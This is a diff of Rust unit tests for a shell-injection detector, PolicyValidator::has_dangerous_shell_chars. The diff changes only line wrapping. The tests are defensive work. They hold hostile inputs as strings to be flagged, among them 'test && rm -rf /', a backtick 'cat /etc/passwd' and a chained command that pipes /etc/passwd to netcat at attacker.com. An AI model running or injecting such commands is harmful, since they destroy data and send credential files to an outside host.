@@ -17,7 +17,9 @@ fn test_shell_injection_pipe() {
 #[test]
 fn test_shell_injection_logical_and() {
     assert!(PolicyValidator::has_dangerous_shell_chars("&&"));
-    assert!(PolicyValidator::has_dangerous_shell_chars("test && rm -rf /"));
+    assert!(PolicyValidator::has_dangerous_shell_chars(
+        "test && rm -rf /"
+    ));
 }
 
 #[test]
@@ -34,7 +36,9 @@ fn test_command_substitution_dollar_paren() {
 #[test]
 fn test_command_substitution_backtick() {
     assert!(PolicyValidator::has_dangerous_shell_chars("`"));
-    assert!(PolicyValidator::has_dangerous_shell_chars("`cat /etc/passwd`"));
+    assert!(PolicyValidator::has_dangerous_shell_chars(
+        "`cat /etc/passwd`"
+    ));
 }
 
 #[test]
@@ -120,7 +124,9 @@ fn test_stdin_with_shell_commands() {
 #[test]
 fn test_argument_with_shell_metachar() {
     // Individual arguments with dangerous chars
-    assert!(PolicyValidator::has_dangerous_shell_chars("arg;othercommand"));
+    assert!(PolicyValidator::has_dangerous_shell_chars(
+        "arg;othercommand"
+    ));
     assert!(PolicyValidator::has_dangerous_shell_chars("arg|tee"));
     assert!(PolicyValidator::has_dangerous_shell_chars("arg&&rm"));
 }
@@ -128,10 +134,16 @@ fn test_argument_with_shell_metachar() {
 #[test]
 fn test_safe_arguments() {
     // Normal arguments should not be flagged
-    assert!(!PolicyValidator::has_dangerous_shell_chars("normal-argument"));
-    assert!(!PolicyValidator::has_dangerous_shell_chars("argument_with_underscore"));
+    assert!(!PolicyValidator::has_dangerous_shell_chars(
+        "normal-argument"
+    ));
+    assert!(!PolicyValidator::has_dangerous_shell_chars(
+        "argument_with_underscore"
+    ));
     assert!(!PolicyValidator::has_dangerous_shell_chars("argument123"));
-    assert!(!PolicyValidator::has_dangerous_shell_chars("argument.with.dots"));
+    assert!(!PolicyValidator::has_dangerous_shell_chars(
+        "argument.with.dots"
+    ));
 }
 
 #[test]
@@ -158,7 +170,9 @@ fn test_glob_expansion_attempt() {
 #[test]
 fn test_combined_injection_vectors() {
     // Multiple injection techniques combined
-    assert!(PolicyValidator::has_dangerous_shell_chars("; $(cat /etc/passwd) | nc attacker.com"));
+    assert!(PolicyValidator::has_dangerous_shell_chars(
+        "; $(cat /etc/passwd) | nc attacker.com"
+    ));
 }
 
 #[test]
